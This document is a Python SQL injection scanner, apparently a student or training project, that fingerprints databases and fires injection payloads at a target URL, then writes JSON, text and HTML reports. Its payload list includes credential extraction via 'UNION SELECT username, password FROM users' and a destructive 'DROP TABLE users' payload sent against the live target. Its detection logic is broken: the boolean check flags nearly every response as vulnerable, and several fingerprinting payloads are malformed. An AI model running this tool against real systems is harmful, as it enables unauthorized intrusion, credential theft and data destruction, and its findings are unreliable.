import requests
from urllib.parse import urlencode, urlparse, parse_qs
import time
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from datetime import datetime
import json
import re

# Try to import colorama for colored output
try:
    from colorama import init, Fore, Style
    init()
    COLORS = True
except ImportError:
    COLORS = False
    class Fore:
        RED = GREEN = YELLOW = CYAN = RESET = ''

class AdvancedSQLiScanner:
    def __init__(self, target_url, delay=0.5, max_threads=5, method='GET'):
        self.target_url = target_url
        self.delay = delay
        self.max_threads = max_threads
        self.method = method.upper()
        self.vulnerabilities = []
        self.lock = threading.Lock()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Advanced-SQLi-Scanner/2.0'
        })
    
    def grab_banner(self, url):
        """Detect database type and version from error messages"""
        print(f"\n{'='*60}")
        print("🔍 Grabbing Database Banner Information")
        print(f"{'='*60}\n")
        
        # Test payloads for different databases
        banner_tests = {
            'MySQL': [
                "' AND 1=0 UNION SELECT @@version--",
                "' AND 1=0 UNION SELECT version()--",
                "' OR @@version LIKE '%'--",
            ],
            'PostgreSQL': [
                "' AND 1=0 SELECT version()--",
                "' OR 1=1::text--",
                "' AND 1=0 SELECT current_database()--",
            ],
            'MSSQL': [
                "' AND 1=0 SELECT @@version--",
                "' AND 1=0 SELECT db_name()--",
                "'; SELECT @@version--",
            ],
            'Oracle': [
                "' AND 1=0 SELECT banner FROM v$version--",
                "' AND 1=0 SELECT global_name FROM global_name--",
                "' OR 1=1 AND ROWNUM=1--",
            ],
            'SQLite': [
                "' AND 1=0 UNION SELECT sqlite_version()--",
                "' AND 1=0 SELECT sqlite_version()--",
                "' OR sqlite_version() LIKE '%'--",
            ]
        }
        
        detected_db = None
        detected_version = None
        detected_details = None
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            print("[!] No parameters found for banner grabbing")
            return None
        
        print("[*] Testing for database fingerprinting...")
        
        for param_name in params.keys():
            for db_type, payloads in banner_tests.items():
                for payload in payloads:
                    # Build test URL
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    new_query = urlencode(test_params, doseq=True)
                    test_url = parsed._replace(query=new_query).geturl()
                    
                    try:
                        response = self.session.get(test_url, timeout=10)
                        response_text = response.text.lower()
                        
                        # Look for version indicators
                        if db_type.lower() in response_text:
                            detected_db = db_type
                            # Try to extract version number
                            version_pattern = r'\d+\.\d+\.\d+|\d+\.\d+'
                            version_match = re.search(version_pattern, response_text)
                            if version_match:
                                detected_version = version_match.group()
                            
                            # Try to get more details
                            if 'sqlite' in response_text and 'version' in response_text:
                                lines = response_text.split('\n')
                                for line in lines:
                                    if 'version' in line and '3.' in line:
                                        detected_details = line.strip()[:100]
                                        break
                            break
                            
                    except requests.exceptions.RequestException:
                        continue
                    
                if detected_db:
                    break
            if detected_db:
                break
        
        # Display results
        print()
        if detected_db:
            if COLORS:
                print(f"{Fore.GREEN}✅ Database Detected: {detected_db}{Fore.RESET}")
                if detected_version:
                    print(f"{Fore.CYAN}📌 Version: {detected_version}{Fore.RESET}")
                if detected_details:
                    print(f"{Fore.YELLOW}ℹ️  Details: {detected_details}{Fore.RESET}")
                print(f"\n{Fore.GREEN}💡 Tip: Use database-specific payloads for better results!{Fore.RESET}")
            else:
                print(f"✅ Database Detected: {detected_db}")
                if detected_version:
                    print(f"📌 Version: {detected_version}")
                if detected_details:
                    print(f"ℹ️  Details: {detected_details}")
                print(f"\n💡 Tip: Use database-specific payloads for better results!")
        else:
            if COLORS:
                print(f"{Fore.YELLOW}⚠️  Could not determine database type from errors{Fore.RESET}")
                print(f"{Fore.YELLOW}💡 Tip: Try testing with more payloads or check if errors are displayed{Fore.RESET}")
            else:
                print(f"⚠️  Could not determine database type from errors")
                print(f"💡 Tip: Try testing with more payloads or check if errors are displayed")
        
        print()
        return {'database': detected_db, 'version': detected_version, 'details': detected_details}
    
    def get_payloads(self):
        """Expanded payload list"""
        return {
            'Error Based': [
                "'",
                "\"",
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 1=1#",
                "1' AND '1'='1",
                "1' AND '1'='2",
            ],
            'Union Based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT username, password FROM users--",
                "1 UNION SELECT 1,2,3--",
            ],
            'Boolean Based': [
                "1' AND '1'='1",
                "1' AND '1'='2",
                "1' AND SLEEP(5)--",
            ],
            'Time Based': [
                "' OR SLEEP(5)--",
                "'; WAITFOR DELAY '00:00:05'--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            ],
            'Destructive (Test Only)': [
                "'; DROP TABLE users; --",
            ]
        }
    
    def test_payload(self, url, param_name, payload, payload_type):
        """Test a single payload"""
        time.sleep(self.delay)  # Rate limiting
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param_name] = [payload]
        new_query = urlencode(params, doseq=True)
        test_url = parsed._replace(query=new_query).geturl()
        
        try:
            start_time = time.time()
            
            if self.method == 'GET':
                response = self.session.get(test_url, timeout=10)
            else:  # POST
                response = self.session.post(url, data={param_name: payload}, timeout=10)
            
            response_time = time.time() - start_time
            
            if self.is_vulnerable(response, payload, response_time):
                vuln_info = {
                    'parameter': param_name,
                    'payload': payload,
                    'type': payload_type,
                    'response_time': f"{response_time:.2f}s",
                    'status_code': response.status_code,
                    'timestamp': datetime.now().isoformat()
                }
                
                with self.lock:
                    self.vulnerabilities.append(vuln_info)
                    
                if COLORS:
                    print(f"{Fore.RED}[!] VULNERABLE{Fore.RESET} [{payload_type}] {param_name} -> {payload[:50]}")
                else:
                    print(f"[!] VULNERABLE [{payload_type}] {param_name} -> {payload[:50]}")
                return True
            else:
                if COLORS:
                    print(f"{Fore.GREEN}[✓] Safe{Fore.RESET} [{payload_type}] {payload[:40]}")
                return False
                
        except requests.exceptions.RequestException as e:
            if COLORS:
                print(f"{Fore.YELLOW}[!] Error{Fore.RESET} {payload[:30]}: {str(e)[:50]}")
            else:
                print(f"[!] Error {payload[:30]}: {str(e)[:50]}")
            return False
    
    def is_vulnerable(self, response, payload, response_time):
        """Enhanced detection with time-based checking"""
        response_text = response.text.lower()
        
        # Error-based detection
        sql_errors = [
            "sql syntax", "mysql_fetch", "ora-", "postgresql",
            "sqlite", "odbc", "incorrect syntax", "unclosed quotation mark",
            "you have an error in your sql", "division by zero",
            "unknown column", "warning: mysql", "database error",
            "executed query", "sqlite3.operationalerror"
        ]
        
        for error in sql_errors:
            if error in response_text:
                return True
        
        # Time-based detection (SLEEP/WAITFOR)
        if "sleep" in payload.lower() or "waitfor" in payload.lower():
            if response_time >= 4.5:  # Expecting ~5 second delay
                return True
        
        # Union/Union All detection
        if "union" in payload.lower() and "select" in payload.lower():
            if len(response_text) > 300:  # Likely returned extra data
                return True
        
        # Boolean-based detection (response length differences)
        if len(response_text) != response_text.count(payload):
            return True
            
        return False
    
    def scan(self):
        """Main scanning function with concurrency"""
        print(f"\n{'='*60}")
        if COLORS:
            print(f"{Fore.CYAN}🔍 Advanced SQL Injection Scanner{Fore.RESET}")
            print(f"{Fore.YELLOW}📡 Target: {self.target_url}{Fore.RESET}")
            print(f"⚙️  Method: {self.method} | Threads: {self.max_threads} | Delay: {self.delay}s")
        else:
            print(f"🔍 Advanced SQL Injection Scanner")
            print(f"📡 Target: {self.target_url}")
            print(f"⚙️  Method: {self.method} | Threads: {self.max_threads} | Delay: {self.delay}s")
        print(f"{'='*60}\n")
        
        # Banner grabbing before scanning
        banner_info = self.grab_banner(self.target_url)
        
        # Parse parameters
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        
        if not params and self.method == 'GET':
            print("[!] No URL parameters found!")
            print("[*] Try: python advanced_scanner.py 'http://target.com/page?id=1'")
            return
        
        param_list = list(params.keys()) if params else ['data']
        payloads_dict = self.get_payloads()
        
        # Flatten payloads with their types
        all_payloads = []
        for ptype, payloads in payloads_dict.items():
            for payload in payloads:
                all_payloads.append((payload, ptype))
        
        print(f"[+] Testing {len(param_list)} parameter(s) with {len(all_payloads)} payloads")
        print(f"[+] Using {self.max_threads} concurrent threads\n")
        
        # Concurrent testing
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for param in param_list:
                for payload, ptype in all_payloads:
                    future = executor.submit(
                        self.test_payload, 
                        self.target_url, 
                        param, 
                        payload, 
                        ptype
                    )
                    futures.append(future)
            
            # Wait for completion
            for future in as_completed(futures):
                pass
        
        self.generate_report()
    
    def generate_report(self):
        """Generate comprehensive report in multiple formats"""
        print(f"\n{'='*60}")
        if COLORS:
            print(f"{Fore.CYAN}📋 SCAN REPORT{Fore.RESET}")
        else:
            print(f"📋 SCAN REPORT")
        print(f"{'='*60}")
        
        if self.vulnerabilities:
            print(f"{Fore.RED if COLORS else ''}[!] Found {len(self.vulnerabilities)} vulnerabilities:{Fore.RESET if COLORS else ''}\n")
            
            # Group by type
            by_type = {}
            for vuln in self.vulnerabilities:
                vtype = vuln['type']
                if vtype not in by_type:
                    by_type[vtype] = []
                by_type[vtype].append(vuln)
            
            for vtype, vulns in by_type.items():
                print(f"{Fore.YELLOW if COLORS else ''}📌 {vtype} ({len(vulns)}):{Fore.RESET if COLORS else ''}")
                for vuln in vulns[:3]:  # Show first 3 of each type
                    print(f"   - {vuln['parameter']}: {vuln['payload'][:60]}")
                if len(vulns) > 3:
                    print(f"   ... and {len(vulns)-3} more")
                print()
        else:
            print(f"{Fore.GREEN if COLORS else ''}[✓] No SQL injection vulnerabilities detected!{Fore.RESET if COLORS else ''}")
        
        # Save JSON report
        report_data = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'total_vulnerabilities': len(self.vulnerabilities),
            'vulnerabilities': self.vulnerabilities,
            'scan_config': {
                'method': self.method,
                'max_threads': self.max_threads,
                'delay': self.delay
            }
        }
        
        with open('scan_report.json', 'w') as f:
            json.dump(report_data, f, indent=2)
        
        # Save text report
        with open('scan_report_detailed.txt', 'w') as f:
            f.write(f"SQL Injection Scan Report\n")
            f.write(f"Target: {self.target_url}\n")
            f.write(f"Time: {datetime.now().ctime()}\n")
            f.write(f"{'='*60}\n\n")
            for vuln in self.vulnerabilities:
                f.write(f"Parameter: {vuln['parameter']}\n")
                f.write(f"Payload: {vuln['payload']}\n")
                f.write(f"Type: {vuln['type']}\n")
                f.write(f"Response Time: {vuln['response_time']}\n")
                f.write(f"{'-'*40}\n")
        
        # Save HTML report
        self.generate_html_report()
        
        if COLORS:
            print(f"{Fore.GREEN}✓ Report saved to: scan_report.json, scan_report_detailed.txt & scan_report.html{Fore.RESET}")
        else:
            print(f"✓ Report saved to: scan_report.json, scan_report_detailed.txt & scan_report.html")
    
    def generate_html_report(self):
        """Generate beautiful HTML report"""
        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL Injection Scan Report</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 20px;
            min-height: 100vh;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }}
        .header {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }}
        .header h1 {{
            font-size: 2.5em;
            margin-bottom: 10px;
        }}
        .header p {{
            font-size: 1.1em;
            opacity: 0.9;
        }}
        .content {{
            padding: 30px;
        }}
        .info-box {{
            background: #f0f0f0;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 30px;
        }}
        .info-box h3 {{
            color: #667eea;
            margin-bottom: 15px;
        }}
        .vuln-count {{
            font-size: 3em;
            font-weight: bold;
            color: #e74c3c;
            text-align: center;
            padding: 20px;
            background: #ffeaa7;
            border-radius: 10px;
            margin-bottom: 30px;
        }}
        .vuln-table {{
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }}
        .vuln-table th {{
            background: #667eea;
            color: white;
            padding: 12px;
            text-align: left;
        }}
        .vuln-table td {{
            padding: 12px;
            border-bottom: 1px solid #ddd;
        }}
        .vuln-table tr:hover {{
            background: #f5f5f5;
        }}
        .payload {{
            font-family: 'Courier New', monospace;
            background: #f8f9fa;
            padding: 5px;
            border-radius: 3px;
            font-size: 0.9em;
        }}
        .critical {{
            color: #e74c3c;
            font-weight: bold;
        }}
        .footer {{
            background: #2c3e50;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }}
        @media (max-width: 768px) {{
            .vuln-table {{
                font-size: 0.8em;
            }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔍 SQL Injection Scanner Report</h1>
            <p>Advanced Security Vulnerability Assessment</p>
        </div>
        <div class="content">
            <div class="info-box">
                <h3>📋 Scan Information</h3>
                <p><strong>Target URL:</strong> {self.target_url}</p>
                <p><strong>Scan Time:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                <p><strong>Method:</strong> {self.method}</p>
                <p><strong>Concurrency:</strong> {self.max_threads} threads</p>
                <p><strong>Delay:</strong> {self.delay}s between requests</p>
            </div>
            
            <div class="vuln-count">
                🚨 {len(self.vulnerabilities)} Vulnerabilities Found
            </div>
            
            <h3>📊 Vulnerability Details</h3>
            <table class="vuln-table">
                <thead>
                    <tr><th>#</th><th>Parameter</th><th>Payload</th><th>Type</th><th>Response Time</th></tr>
                </thead>
                <tbody>
"""
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            html_content += f"""
                    <tr>
                        <td>{i}</td>
                        <td><strong>{vuln['parameter']}</strong></td>
                        <td><span class="payload">{vuln['payload']}</span></td>
                        <td class="critical">{vuln['type']}</td>
                        <td>{vuln['response_time']}</td>
                    </tr>
"""
        
        html_content += f"""
                </tbody>
            </table>
        </div>
        <div class="footer">
            <p>Generated by Syntexhub Advanced SQL Injection Scanner | Ethical Security Testing Tool</p>
            <p>⚠️ This report is for authorized testing purposes only</p>
        </div>
    </div>
</body>
</html>
"""
        
        with open('scan_report.html', 'w', encoding='utf-8') as f:
            f.write(html_content)

# Main execution
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("="*60)
        print("🔍 Advanced SQL Injection Scanner - Syntexhub Project")
        print("="*60)
        print("\nUsage: python advanced_sql_scanner.py <target_url> [method] [threads]")
        print("\nExamples:")
        print("  python advanced_sql_scanner.py 'http://localhost:5000/?id=1' GET 10")
        print("  python advanced_sql_scanner.py 'http://testphp.vulnweb.com/artists.php?artist=1' GET 5")
        print("  python advanced_sql_scanner.py 'http://test.com/login' POST 5")
        print("\n⚠️  Ethical Use Only - Test only on authorized targets!")
        print("="*60)
        sys.exit(1)
    
    target = sys.argv[1]
    method = sys.argv[2] if len(sys.argv) > 2 else 'GET'
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 5
    
    # Install colorama if not present
    if COLORS == False:
        print("[*] For colored output: pip install colorama")
    
    print("\n⚠️  LEGAL DISCLAIMER: This tool is for educational purposes only.")
    print("   Only test systems you own or have explicit permission to test.\n")
    time.sleep(2)
    
    scanner = AdvancedSQLiScanner(target, delay=0.3, max_threads=threads, method=method)
    scanner.scan()